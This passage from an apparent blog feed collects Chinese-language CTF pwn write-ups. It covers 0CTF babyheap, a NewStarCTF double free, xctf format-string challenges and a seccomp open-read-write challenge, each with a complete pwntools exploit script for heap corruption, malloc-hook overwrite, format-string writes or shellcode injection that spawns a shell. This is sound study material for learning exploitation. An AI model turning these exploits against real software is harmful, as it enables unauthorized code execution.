src="/img/0ctfbabyheap/media/d2c594003ca8f723af882a81bbbe1a68.png"></p><p>可以看到大小位0x100的chunk被放到了unsrted bin里，大小为0x80的放在了fastbin里</p><p><img src="/img/0ctfbabyheap/media/4aa0984ec87d5b2721a1b63d3c0b0c35.png"></p><p>然后把0x80的chunk再分配出来，进行溢出到chunk 2</p><p><img src="/img/0ctfbabyheap/media/b9f09f039c80b6c859a240d87234f2ed.png"></p><p>可以看到下一个chunk被改成了inuse为0的状态，prevsize被修改成了0x180，也就是前面两个chunk合并起来的大小</p><p><img src="/img/0ctfbabyheap/media/85331735315afc1ca327cebb35515deb.png"></p><p>如果这时候free掉chunk2，会把最开头的chunk从unsorted bin里拿出来，与其进行合并，然后合并之后的chunk一起被放在unsorted bin里。由于合并的过程把中间的chunk 1给合并进去了，但是它还是被分配的状态，就可以进行chunk内容的输出泄露。</p><p><img src="/img/0ctfbabyheap/media/be30a52291628b8928b773d513e70516.png"></p><p><img src="/img/0ctfbabyheap/media/fde0bcc5e16b386bd5e757816bca0c8e.png"></p><p><img src="/img/0ctfbabyheap/media/35f83a6472e30559fbcaafe98ab0f101.png"></p><p>形成了0x280这个大的chunk中嵌套着一个小的处于被分配的chunk的overlapping。而这个chunk处于0x280这个大块的0x100偏移处，想要通过它打印出来fd和bk要把这个unsorted bin切割一下。</p><p><img src="/img/0ctfbabyheap/media/ebc1e7f864fc9b1007afad94f5096a31.png"></p><p><img src="/img/0ctfbabyheap/media/21336897cb0da16774853f0e20bbefb0.png"></p><p>这样就有了两个处于完全相同地址上的free、malloc状态的chunk。</p><p>然后dump malloc状态的块，就会把free状态的chunk的fd bk打印出来，而这个fd bk由于unsorted bin里只有这一个chunk节点，fd bk会指向malloc_state结构体里的unsorted bin数组项，对应main_arena+88的位置，根据这个便宜可以确定libc的基地址。</p><p><img src="/img/0ctfbabyheap/media/3b3ade9638161cf21a58f60c6558832b.png"></p><p><img src="/img/0ctfbabyheap/media/4d12325def65c8eab07cc7712b394a95.png"></p><p>然后需要进行一个fast bin attack的double free，具体过程为：</p><p>free chunk a， free chunk b，free chunk a，malloc chunk a， malloc chunk b， edit chunk a，malloc chunk a，malloc 任意地址的chunk进行edit。</p><p>首先，不连续free a两次的原因是会有检查机制，bins会检查当前链表顶部的chunk的地址和现在free的地址是否相同，相同会被视为double free，但如果中间free了其它chunk，则会绕过这个检查。然后malloc a之后编辑它的fd，下次malloc 的时候自己写入的fd指向的地址会被视为一个chunk，然后malloc出来就可以对其进行写入，完成任意地址写。</p><p>上述流程在这道题里的表述为：</p><p><img src="/img/0ctfbabyheap/media/aa97c259cc69d78bd91e0337b0db3725.png"></p><p>被写入的地方是malloc hook，如果malloc 时这上面的地址不是0，就会执行malloc hook指向的函数。向这个地址写入一段gadget的地址。</p><p>需要说明的点在于one_gadget得到的调用execve binsh的代码</p><p><img src="/img/0ctfbabyheap/media/530dce4d01190360fdb9f3bcfb99a79c.png"></p><p>选用的是第二个0x4526a（这个我不知道为啥大家都用它，其他几个没试过）</p><p>然后通过fast bin attack 就执行了execve，拿到shell</p><p>测试：</p><p>在buuoj上打开这道题，验证了一下exp确实是对的。</p><p><img src="/img/0ctfbabyheap/media/cf295e9198a01c7f4e082b7ccd607e5a.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Import pwntools</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># First establish the target process and libc file</span><br>target = process(<span class="hljs-string">&#x27;./0ctfbabyheap&#x27;</span>, env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>:<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>&#125;) <span class="hljs-comment"># The ld_preload is used to switch out the libc version we are using</span><br><span class="hljs-comment">#gdb.attach(target)</span><br>elf = ELF(<span class="hljs-string">&#x27;libc-2.23.so&#x27;</span>)<br><br><span class="hljs-comment"># Establish the functions to interact with the program</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">alloc</span>(<span class="hljs-params">size</span>):<br>target.recvuntil(<span class="hljs-string">b&quot;Command: &quot;</span>)<br>target.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>target.recvuntil(<span class="hljs-string">b&quot;Size: &quot;</span>)<br>target.sendline(<span class="hljs-built_in">str</span>(size).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fill</span>(<span class="hljs-params">index, size, content</span>):<br>target.recvuntil(<span class="hljs-string">b&quot;Command: &quot;</span>)<br>target.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br>target.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)<br>target.sendline(<span class="hljs-built_in">str</span>(index).encode())<br>target.recvuntil(<span class="hljs-string">b&quot;Size: &quot;</span>)<br>target.sendline(<span class="hljs-built_in">str</span>(size).encode())<br>target.recvuntil(<span class="hljs-string">b&quot;Content: &quot;</span>)<br>target.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>target.recvuntil(<span class="hljs-string">b&quot;Command: &quot;</span>)<br>target.sendline(<span class="hljs-string">b&quot;3&quot;</span>)<br>target.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)<br>target.sendline(<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>(<span class="hljs-params">index</span>):<br>target.recvuntil(<span class="hljs-string">b&quot;Command&quot;</span>)<br>target.sendline(<span class="hljs-string">b&quot;4&quot;</span>)<br>target.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)<br>target.sendline(<span class="hljs-built_in">str</span>(index).encode())<br>target.recvuntil(<span class="hljs-string">b&quot;Content: \n&quot;</span>)<br>content = target.recvline()<br><span class="hljs-keyword">return</span> content<br><br><span class="hljs-comment"># Make the initial four allocations, and fill them with data</span><br>alloc(<span class="hljs-number">0xf0</span>)<span class="hljs-comment"># Chunk 0</span><br>alloc(<span class="hljs-number">0x70</span>)<span class="hljs-comment"># Chunk 1</span><br>alloc(<span class="hljs-number">0xf0</span>)<span class="hljs-comment"># Chunk 2</span><br>alloc(<span class="hljs-number">0x30</span>)<span class="hljs-comment"># Chunk 3</span><br>fill(<span class="hljs-number">0</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-string">&quot;0&quot;</span>*<span class="hljs-number">0xf0</span>)<br>fill(<span class="hljs-number">1</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&quot;1&quot;</span>*<span class="hljs-number">0x70</span>)<br>fill(<span class="hljs-number">2</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-string">&quot;2&quot;</span>*<span class="hljs-number">0xf0</span>)<br>fill(<span class="hljs-number">3</span>, <span class="hljs-number">0x30</span>, <span class="hljs-string">&quot;3&quot;</span>*<span class="hljs-number">0x30</span>)<br><br><span class="hljs-comment"># Free the first two</span><br>free(<span class="hljs-number">0</span>)<span class="hljs-comment"># Chunk 0</span><br>free(<span class="hljs-number">1</span>)<span class="hljs-comment"># Chunk 1</span><br><br><span class="hljs-comment"># Allocate new space where chunk 1 used to be, and overflow chunk chunk 2&#x27;s previous size with 0x180 and the previous in use bit with 0x0 by pushing 0x100</span><br>alloc(<span class="hljs-number">0x78</span>)<span class="hljs-comment"># Chunk 0</span><br>fill(<span class="hljs-number">0</span>, <span class="hljs-number">128</span>, <span class="hljs-string">b&#x27;4&#x27;</span>*<span class="hljs-number">0x70</span> + p64(<span class="hljs-number">0x180</span>) + p64(<span class="hljs-number">0x100</span>))<br><br><span class="hljs-comment"># Free the second chunk, which will bring the edge of the heap before the new chunk 0, thus effictively forgetting about Chunk 0</span><br>free(<span class="hljs-number">2</span>)<br><br><span class="hljs-comment"># Allocate a new chunk that will move the libc address for main_arena+88 into the content </span><br>alloc(<span class="hljs-number">0xf0</span>)<span class="hljs-comment"># Chunk 1</span><br>fill(<span class="hljs-number">1</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-string">&#x27;5&#x27;</span>*<span class="hljs-number">0xf0</span>)<br><br><span class="hljs-comment"># Print the contents of chunk 0, and filter out the main_arena+88 infoleak, and calculate the offsets for everything else</span><br>leak = u64(dump(<span class="hljs-number">0</span>)[<span class="hljs-number">0</span>:<span class="hljs-number">8</span>])<br>libc = leak - elf.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>] - <span class="hljs-number">0x68</span><br>system = libc + <span class="hljs-number">0x4526a</span><br>malloc_hook = libc + elf.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>free_hook = libc + elf.symbols[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>fake_chunk = malloc_hook - <span class="hljs-number">0x23</span><br>log.info(<span class="hljs-string">&quot;Leak is:        &quot;</span> + <span class="hljs-built_in">hex</span>(leak))<br>log.info(<span class="hljs-string">&quot;System is:      &quot;</span> + <span class="hljs-built_in">hex</span>(system))<br>log.info(<span class="hljs-string">&quot;Free hook is:   &quot;</span> + <span class="hljs-built_in">hex</span>(free_hook))<br>log.info(<span class="hljs-string">&quot;Malloc hook is: &quot;</span> + <span class="hljs-built_in">hex</span>(malloc_hook))<br>log.info(<span class="hljs-string">&quot;Fake chunk is:  &quot;</span> + <span class="hljs-built_in">hex</span>(fake_chunk))<br>log.info(<span class="hljs-string">&quot;libc is:        &quot;</span> + <span class="hljs-built_in">hex</span>(libc))<br><br><span class="hljs-comment"># Free the first chunk to make room for the double free/fastbin duplicaion</span><br>free(<span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># Allocate the next four chunks, chunk 5 will directly overlap with chunk 0 and both chunks will have the same pointer</span><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment"># Chunk 1</span><br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment"># Chunk 2</span><br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment"># Chunk 4</span><br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment"># Chunk 5</span><br><br><span class="hljs-comment"># Commence the double free by freeing 5 then 0, and 4 in between to stop a crash</span><br>free(<span class="hljs-number">5</span>)<br>free(<span class="hljs-number">4</span>)<br>free(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># Allocate 2 chunks, fill in the chunk that was freed twice with the fake chunk, allocate that chunk again to add the fake chunk to the free list</span><br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment"># Chunk 4</span><br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment"># Chunk 5</span><br>fill(<span class="hljs-number">0</span>, <span class="hljs-number">0x60</span>, p64(fake_chunk) + p64(<span class="hljs-number">0</span>) + <span class="hljs-string">b&#x27;y&#x27;</span>*<span class="hljs-number">0x50</span>)<br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment"># Chunk 0</span><br><br><span class="hljs-comment"># Allocate the fake chunk, and write over the malloc hook with the One Shot Gadget</span><br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment"># Chunk 6</span><br>fill(<span class="hljs-number">6</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-string">b&#x27;z&#x27;</span>*<span class="hljs-number">0x13</span> + p64(system))<br><br><span class="hljs-comment"># Trigger a Malloc call to trigger the malloc hook, and pop a shell</span><br>target.sendline(<span class="hljs-string">b&#x27;1\n1\n&#x27;</span>)<br>target.recvuntil(<span class="hljs-string">b&quot;Size: &quot;</span>)<br><br><span class="hljs-comment"># Drop to an interactive shell to use the shell</span><br>target.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fastbin Attack</title>
    <link href="/2023/10/24/ctf-pwn/Fastbin%20Attack/"/>
    <url>/2023/10/24/ctf-pwn/Fastbin%20Attack/</url>
    
    <content type="html"><![CDATA[<h4 id="Fastbin"><a href="#Fastbin" class="headerlink" title="Fastbin"></a>Fastbin</h4><h5 id="Double-Free"><a href="#Double-Free" class="headerlink" title="Double Free"></a>Double Free</h5><p>以buuoj NewStarCTF 2023 week 4 Double为例</p><p>目的是向任意地址写入值</p><p>经典的网图</p><p><img src="/img/Fastbin/1.jpg"></p><p>原理在于，三次free之后，第一次把chunk1 malloc出来之后，可以对content部分进行编辑，而content对于第三次malloc出来的chunk1是fd，这个fd在第四次malloc时，会从自己写的地址进行malloc，然后这个malloc出来的块的content又是可编辑的。这样就实现了任意地址写。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = process(&quot;./Double&quot;)</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">25942</span>)<br><br><span class="hljs-comment">#gdb.attach(p, &quot;b *0x080486B5&quot;)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx, content</span>):<br>  p.recvuntil(<span class="hljs-string">b&quot;&gt;\n&quot;</span>)<br>  p.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>  p.recvuntil(<span class="hljs-string">b&quot;Input idx\n&quot;</span>)<br>  p.sendline(idx)<br>  p.recvuntil(<span class="hljs-string">b&quot;Input content\n&quot;</span>)<br>  p.sendline(content)<br>  <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>  p.recvuntil(<span class="hljs-string">b&quot;&gt;\n&quot;</span>)<br>  p.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br>  p.recvuntil(<span class="hljs-string">b&quot;Input idx\n&quot;</span>)<br>  p.sendline(idx)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>():  <br>  p.recvuntil(<span class="hljs-string">b&quot;&gt;\n&quot;</span>)<br>  p.sendline(<span class="hljs-string">b&quot;3&quot;</span>)<br>  <br>  <br>add(<span class="hljs-string">b&#x27;1&#x27;</span>, <span class="hljs-string">b&quot;aaaa&quot;</span>)<br>add(<span class="hljs-string">b&#x27;2&#x27;</span>, <span class="hljs-string">b&quot;bbbb&quot;</span>)<br>free(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>free(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>free(<span class="hljs-string">b&#x27;1&#x27;</span>)<br><br>add(<span class="hljs-string">b&#x27;1&#x27;</span>, p64(<span class="hljs-number">0x602070</span> - <span class="hljs-number">16</span>))<br><br>add(<span class="hljs-string">b&#x27;2&#x27;</span>, <span class="hljs-string">b&#x27;dddd&#x27;</span>)<br><br>add(<span class="hljs-string">b&#x27;3&#x27;</span>, <span class="hljs-string">b&#x27;eeee&#x27;</span>)<br><br>add(<span class="hljs-string">b&#x27;4&#x27;</span>, p64(<span class="hljs-number">1638</span>))<br><br>check()<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h5 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h5><h5 id="Alloc-to-Stack"><a href="#Alloc-to-Stack" class="headerlink" title="Alloc to Stack"></a>Alloc to Stack</h5><h5 id="Arbitary-Alloc"><a href="#Arbitary-Alloc" class="headerlink" title="Arbitary Alloc"></a>Arbitary Alloc</h5>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>FormatString</title>
    <link href="/2023/10/23/ctf-pwn/FormatString/"/>
    <url>/2023/10/23/ctf-pwn/FormatString/</url>
    
    <content type="html"><![CDATA[<h4 id="xctf-string"><a href="#xctf-string" class="headerlink" title="xctf string"></a>xctf string</h4><p><img src="/img/FormatString/1.png"></p><p>简单的格式化字符串</p><p>这道题目需要注意的点包括</p><ol><li><p>题目中用%x打印出来的地址，可以直接用<code>int(...,16)</code>来接收，不要用ljust那一套。。。（-_-||</p></li><li><p>在利用格式化字符串漏洞的时候，如果用<code>p64(addr)  + %n(或者%p)...</code>时，要先保证addr没有<code>\0</code></p><p>就像这道题，我一开始就非得不用它那个%ld输入要写入的地址，就非要把x[0]的地址和后面那一串一起写进去，后果就是print(format)时候根本不会打印aaaa…..和%n，因为地址里有\0，直接停止了😭还在那看了好半天是不是地址的格式问题</p></li><li><p><code>shellcraft.sh</code>用之前**一定要先指定平台 **<code> context(arch=&#39;amd64&#39;, os=&#39;linux&#39;)</code></p></li></ol><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = process(&quot;./1d3c852354df4609bf8e56fe8e9df316&quot;)</span><br>p = remote(<span class="hljs-string">&quot;61.147.171.105&quot;</span>, <span class="hljs-number">58702</span>)<br><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>e = ELF(<span class="hljs-string">&quot;./1d3c852354df4609bf8e56fe8e9df316&quot;</span>)<br><br><span class="hljs-comment">#gdb.attach(p, &quot;b *0x400d36&quot;)</span><br><br>p.recvuntil(<span class="hljs-string">b&quot;secret[0] is &quot;</span>)<br>x0 = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&quot;\n&quot;</span>)[:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(x0))<br><br>p.recvuntil(<span class="hljs-string">b&quot;What should your character&#x27;s name be:\n&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;123&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&quot;So, where you will go?east or up?:&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;east&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;go into there(1), or leave(0)?:\n&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&quot;\&#x27;Give me an address\&#x27;\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(x0))<br><br>p.recvuntil(<span class="hljs-string">b&quot;And, you wish is:\n&quot;</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">85</span> + <span class="hljs-string">b&quot;%7$n&quot;</span><br><span class="hljs-comment">#payload = b&#x27;aaaaaaaa&#x27; + b&quot;%p%p%p%p-%p%p%p%p-%p%p%p%p-%p%p%p%p&quot;</span><br>p.sendline(payload)<br><br>p.recvuntil(<span class="hljs-string">b&quot;That&#x27;s sound terrible! you meet final boss!but you level is ONE!\n&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Wizard: I will help you! USE YOU SPELL\n&quot;</span>)<br><br><span class="hljs-comment">#shellcode = &#x27;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05&#x27;</span><br><br>shellcode = asm(shellcraft.sh())<br><br><br>p.sendline(shellcode)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h4 id="gyctf-2020-some-thing-interesting"><a href="#gyctf-2020-some-thing-interesting" class="headerlink" title="gyctf_2020_some_thing_interesting"></a>gyctf_2020_some_thing_interesting</h4><p><a href="https://buuoj.cn/challenges#gyctf_2020_some_thing_interesting">https://buuoj.cn/challenges#gyctf_2020_some_thing_interesting</a></p><p>本地运行不起来，不知道是什么原因。</p><p>直接在栈上泄露返回<code>__libc_start_main</code>的偏移地址，算出libc</p><p>参考 <a href="https://blog.csdn.net/mcmuyanga/article/details/114643601">https://blog.csdn.net/mcmuyanga/article/details/114643601</a></p><p><img src="/img/FormatString/2.jpg"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">r.recvuntil(<span class="hljs-string">&quot;&gt; Input your code please:&quot;</span>)<br>r.sendline(<span class="hljs-string">&quot;OreOOrereOOreO%17$p&quot;</span>)<span class="hljs-comment">#elf 11 libc 17</span><br><br>r.recvuntil(<span class="hljs-string">&quot;#######################\n&quot;</span>)<br>r.sendline(<span class="hljs-string">&#x27;0&#x27;</span>)<br>r.recvuntil(<span class="hljs-string">&quot;# Your Code is &quot;</span>)<br>r.recvuntil(<span class="hljs-string">&#x27;0x&#x27;</span>)<br><br>start_main = <span class="hljs-built_in">int</span>(r.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0xf0</span><br>libc.address = start_main - libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>fmt</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>orw</title>
    <link href="/2023/10/18/ctf-pwn/orw/"/>
    <url>/2023/10/18/ctf-pwn/orw/</url>
    
    <content type="html"><![CDATA[<h5 id="安装seccomp"><a href="#安装seccomp" class="headerlink" title="安装seccomp"></a>安装seccomp</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt install gcc ruby-dev<br>gem install seccomp-tools<br></code></pre></td></tr></table></figure><p><a href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Not%20Bad">https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Not%20Bad</a></p><p><img src="/img/orw/1.jpg"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p = process(&quot;./bad&quot;)</span><br>p=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28003</span>)<br><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>mmap=<span class="hljs-number">0x123000</span><br>jmp_rsp = <span class="hljs-number">0x400A01</span><br>orw_payload = shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./flag&quot;</span>)<br>orw_payload += shellcraft.read(<span class="hljs-number">3</span>, mmap, <span class="hljs-number">0x50</span>)<br>orw_payload += shellcraft.write(<span class="hljs-number">1</span>, mmap,<span class="hljs-number">0x50</span>)<br><br>payload=asm(shellcraft.read(<span class="hljs-number">0</span>,mmap,<span class="hljs-number">0x100</span>))+asm(<span class="hljs-string">&#x27;mov rax,0x123000;call rax&#x27;</span>)<br>payload=payload.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload+=p64(jmp_rsp)+asm(<span class="hljs-string">&#x27;sub rsp,0x30;jmp rsp&#x27;</span>)<br><span class="hljs-comment"># ret的时候，相当于pop rip，rsp就会指向返回地址下一个栈参数，也就是说，jmp rsp之后，就会执行sub rsp,0x30</span><br><br>p.recvuntil(<span class="hljs-string">&#x27;Easy shellcode, have fun!&#x27;</span>)<br>p.sendline(payload)<br><br>shellcode=asm(orw_payload)<br>p.sendline(shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>stack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Stack Migration</title>
    <link href="/2023/10/11/ctf-pwn/stack_migration/"/>
    <url>/2023/10/11/ctf-pwn/stack_migration/</url>
    
